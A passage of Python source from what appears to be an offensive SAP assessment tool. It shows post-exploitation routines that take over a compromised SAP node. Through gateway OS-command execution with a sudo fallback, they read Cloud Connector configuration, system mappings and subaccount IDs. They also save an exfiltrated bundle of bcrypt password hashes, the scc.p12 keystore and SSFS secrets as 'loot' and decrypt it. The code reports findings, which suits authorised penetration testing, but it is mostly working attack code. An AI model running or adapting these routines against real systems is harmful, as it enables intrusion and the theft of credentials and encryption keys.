        fh.write(raw)
    try:
        os.chmod(loot_path, 0o600)
    except Exception:
        pass
    result["loot_path"] = loot_path
    result["bytes_recovered"] = len(raw)

    method_label = f"LPE/{method} → root tar"
    print(f"[+] {sid}: scc_hashes_via_lpe — loot saved → {loot_path} "
          f"({len(raw)} B)")

    emit_finding(
        "CRITICAL", sid,
        f"SCC config bundle (incl. users.xml bcrypt hashes) "
        f"exfiltrated from {sid} via {method_label}: SSFS, scc.p12, "
        f"users.xml recovered at {loot_path}",
        ref="scc.harvest.loot_exfilled_via_lpe",
        attack_capability="data.scc_users_dump_via_lpe",
        meta={"loot_path": loot_path,
              "size": len(raw),
              "method": method_label,
              "lpe_technique": method})

    # SSFS decrypt + mappings parse + hash list — mirror what
    # _save_and_parse does inside harvest_scc_from_pwned_node so the
    # downstream UI surfaces (decrypted secrets list, mappings count,
    # users.xml hash table) look identical regardless of which exfil
    # path got us the bundle.
    try:
        from sapmap_scc_keystore import (
            parse_ha_state_from_zip, parse_mappings_from_zip)
        ha = parse_ha_state_from_zip(loot_path) or {}
        if ha.get("peer_host"):
            print(f"[*] {sid}: scc_hashes_via_lpe HA peer="
                  f"{ha['peer_host']}")
        maps = parse_mappings_from_zip(loot_path) or {}
        if maps.get("mappings"):
            print(f"[*] {sid}: scc_hashes_via_lpe mappings: "
                  f"{len(maps['mappings'])} entries")
    except Exception as pe:
        logger.debug(f"scc_hashes_via_lpe parse error: {pe}")
    try:
        from sapmap_scc_ssfs_decrypt import decrypt_and_unlock
        dr = decrypt_and_unlock(loot_path)
        if dr and dr.get("ok"):
            print(f"[+] {sid}: scc_hashes_via_lpe SSFS decrypted")
    except Exception as se:
        logger.debug(f"scc_hashes_via_lpe ssfs decrypt: {se}")

    result["ok"] = True
    return result


def harvest_scc_mappings_from_pwned_node(node: SAPNode, state: SAPMAPState) -> dict:
    """Read SCC mapping config from disk via OS-exec on co-located pwned node.

    No SCC admin credentials needed. Reads backends.xml + resource XMLs
    directly from /opt/sap/scc/scc_config/.

    Returns {ok, mappings, subaccount_uuids, regions, error}.
    """
    sid = node.sid or "?"

    def _gw_b64(prog, arg):
        """Run prog arg via SAPXPG, base64-decode output. Returns (bytes|None, err_str)."""
        r = execute_gw_command(node, prog, arg, long_params="")
        out = "\n".join(r.get("output") or []).strip()
        if not out or "Permission denied" in out or "No such file" in out:
            return None, out[:120]
        import base64 as _b64
        try:
            return _b64.b64decode(out.replace("\n","").replace("\r","")), ""
        except Exception as e:
            return None, f"b64decode: {format_rfc_exception(e)}"

    def _read(path):
        """Read file via base64, sudo fallback."""
        data, err = _gw_b64("base64", path)
        if data is None and "Permission denied" in err:
            data, err = _gw_b64("sudo", f"base64 {path}")
        return data

    # Step 1: find SCC root
    scc_root = None
    for candidate in ["/opt/sap/scc", "/usr/local/scc", "/opt/sapscc",
                       "/opt/cloud-connector", "/opt/SAP/cloud-connector"]:
        r = execute_gw_command(node, "ls",
                               f"{candidate}/scc_config/scc_config.ini",
                               long_params="")
        out = "\n".join(r.get("output") or []).strip()
        if f"{candidate}/scc_config/scc_config.ini" in out and \
                "No such file" not in out:
            scc_root = candidate
            print(f"[*] {sid}: harvest_scc_mappings — SCC root={scc_root}")
            break
    if not scc_root:
        return {"ok": False, "error": "SCC install not found on this host"}

    # Step 2: read scc_config.ini to enumerate region/uuid pairs
    cfg_bytes = _read(f"{scc_root}/scc_config/scc_config.ini")
    region_uuid_pairs = []
    if cfg_bytes:
        try:
            import xml.etree.ElementTree as _ET2
            root_el = _ET2.fromstring(cfg_bytes)
            # scc_config.ini structure:
            # <configuredAccounts><account>
            #   <landscapeHost>cf.eu10...</landscapeHost>
            #   <name>28a6e19d-...</name>   ← UUID
            # </account></configuredAccounts>
            for acc in root_el.iter("account"):
                region = (acc.findtext("landscapeHost") or
                          acc.findtext("regionHost") or
                          acc.findtext("region") or "").strip()
                uuid = (acc.findtext("name") or
                        acc.findtext("id") or
                        acc.findtext("subaccount") or
                        acc.findtext("uuid") or "").strip()
                if region and uuid:
                    region_uuid_pairs.append((region, uuid))
        except Exception as e:
            logger.debug(f"harvest_scc_mappings scc_config.ini parse: {format_rfc_exception(e)}")
    if not region_uuid_pairs:
        # Fallback: enumerate region and UUID dirs via ls.
        # ls /opt/sap/scc/scc_config/ returns space-separated entries on
        # one line; regions look like hostnames (contain dots, no extension).
        print(f"[*] {sid}: harvest_scc_mappings — scc_config.ini parse "
              f"gave no pairs, falling back to directory enumeration")
        import re as _re2
        UUID_RE = _re2.compile(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', _re2.I)
        NON_REGION = {'scc_config.ini', 'scc_config.stamp', 'scc.p12',
                      'SSFS_SCC.DAT', 'SSFS_SCC.KEY', 'scc_config.stamp'}
        # List top-level scc_config directory
        r_top = execute_gw_command(node, "ls", f"{scc_root}/scc_config/", long_params="")
        top_out = " ".join(r_top.get("output") or [])
        print(f"[*] {sid}: harvest_scc_mappings — ls scc_config/: {top_out[:120]!r}")
        for entry in top_out.split():
            entry = entry.strip("/ \t\r\n")
            if not entry or entry in NON_REGION:
                continue
            if '.' not in entry:   # regions are hostnames with dots
                continue
            region = entry
            # List UUID subdirs of this region
            r_reg = execute_gw_command(node, "ls",
                                       f"{scc_root}/scc_config/{region}/",
                                       long_params="")
            reg_out = " ".join(r_reg.get("output") or [])
            print(f"[*] {sid}: harvest_scc_mappings — ls {region}/: {reg_out[:120]!r}")
            for sub in reg_out.split():
                sub = sub.strip("/ \t\r\n")
                if UUID_RE.match(sub):
                    region_uuid_pairs.append((region, sub))
                    print(f"[*] {sid}: harvest_scc_mappings — found {region}/{sub}")

    if not region_uuid_pairs:
        return {"ok": False, "error": "Could not enumerate subaccounts (ini parse and dir ls both failed)"}

    print(f"[*] {sid}: harvest_scc_mappings — {len(region_uuid_pairs)} subaccount(s)")

    # Step 3+4: read backends.xml and resource XMLs per subaccount
    all_maps = []
    uuids = []
    regions = []
    from sapmap_scc_keystore import parse_mappings_from_backends_xml

    for region, uuid in region_uuid_pairs:
        if uuid not in uuids:
            uuids.append(uuid)
        if region not in regions:
            regions.append(region)
        base = f"{scc_root}/scc_config/{region}/{uuid}"
        bxml = _read(f"{base}/backends.xml")
        if not bxml:
            print(f"[-] {sid}: harvest_scc_mappings — could not read "
                  f"{base}/backends.xml")
            continue
        # Collect resource XMLs for this subaccount
        resource_xmls = {}
        # Parse backends.xml first to know which resource files to fetch
        try:
            import xml.etree.ElementTree as _ET3
            bt = _ET3.fromstring(bxml)
            for sm in bt.iter("systemMapping"):
                vh = (sm.findtext("virtualHost") or "").strip()
                vp = (sm.findtext("virtualPort") or "0").strip()
                stem = f"{vh}_{vp}"
                res_bytes = _read(f"{base}/{stem}.xml")
                if res_bytes:
                    resource_xmls[stem] = res_bytes
        except Exception as e:
            logger.debug(f"harvest_scc_mappings resource enum: {format_rfc_exception(e)}")

        maps = parse_mappings_from_backends_xml(bxml, region, uuid, resource_xmls)
        print(f"[*] {sid}: harvest_scc_mappings — {region}/{uuid}: "
              f"{len(maps)} mapping(s)")
        all_maps.extend(maps)

    if not all_maps:
        return {"ok": False, "error": "No mappings found in any subaccount"}

    try:
        from sapmap_findings import emit_finding
        emit_finding(
            "HIGH", sid,
            f"SCC mapping config harvested from {sid} via OS-exec: "
            f"{len(all_maps)} mapping(s) in {len(uuids)} subaccount(s). "
            f"No SCC admin credentials needed.",
            ref="scc.harvest.mappings",
            meta={"mappings": len(all_maps), "subaccounts": len(uuids),
                  "regions": regions})
    except Exception:
        pass

    return {"ok": True, "mappings": all_maps,
            "subaccount_uuids": uuids, "regions": regions}
